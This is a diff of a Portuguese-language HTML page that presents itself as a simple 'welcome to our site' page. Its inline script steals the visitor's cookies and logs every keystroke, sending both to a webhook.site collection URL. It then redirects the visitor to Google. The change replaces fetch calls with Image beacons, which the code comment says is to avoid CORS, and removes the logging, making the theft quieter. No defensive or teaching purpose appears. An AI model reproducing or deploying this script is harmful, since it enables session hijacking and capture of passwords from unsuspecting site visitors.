@@ -7,38 +7,27 @@
 
 <body>
 
-    <h1>Bem-vindo ao nosso site! 3</h1>
+    <h1>Bem-vindo ao nosso site! 4</h1>
     <script>
-        async function capturarDados() {
+        function capturarDados() {
             let cookies = document.cookie;
 
-            // Testar se há cookies antes de enviar
-            if (!cookies) {
-                console.warn("Nenhum cookie encontrado. O document.cookie pode estar bloqueado.");
-            } else {
-                console.log("Cookies capturados:", cookies);
-            }
-
-            // Enviar para o webhook
-            try {
-                await fetch("https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?cookies=" + encodeURIComponent(cookies));
-                console.log("Cookies enviados com sucesso.");
-            } catch (error) {
-                console.error("Erro ao enviar cookies:", error);
-            }
+            // Usar Image() para evitar CORS
+            var i = new Image();
+            i.src = "https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?cookies=" + encodeURIComponent(cookies);
 
             // Capturar teclas pressionadas
             document.addEventListener("keydown", function (event) {
-                fetch("https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?key=" + event.key);
+                var keyLogger = new Image();
+                keyLogger.src = "https://webhook.site/493fc1c1-9d70-4701-9a56-a7c691e18389?key=" + event.key;
             });
 
-            // Aguardar um pouco antes do redirecionamento
+            // Espera antes de redirecionar
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
             }, 1500);
         }
 
-        // Executar a função
         capturarDados();
     </script>
 </body>
